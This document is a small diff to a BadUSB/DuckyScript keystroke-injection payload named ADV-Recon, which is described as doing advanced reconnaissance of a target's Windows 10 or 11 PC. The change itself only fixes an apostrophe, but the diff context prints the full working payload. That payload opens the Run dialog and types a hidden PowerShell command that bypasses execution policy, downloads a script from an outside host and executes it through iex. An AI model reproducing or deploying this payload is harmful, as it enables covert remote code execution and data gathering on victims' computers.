@@ -2,7 +2,7 @@ REM     Title: ADV-Recon
 
 REM     Author: I am Jakoby
 
-REM     Description: This payload is meant to do an advanced recon of the targets PC. See README.md file for more details.
+REM     Description: This payload is meant to do an advanced recon of the target's PC. See README.md file for more details.
 
 REM     Target: Windows 10, 11
 
@@ -10,4 +10,3 @@ GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr jakoby.lol/aucrjmf | iex
 ENTER
-
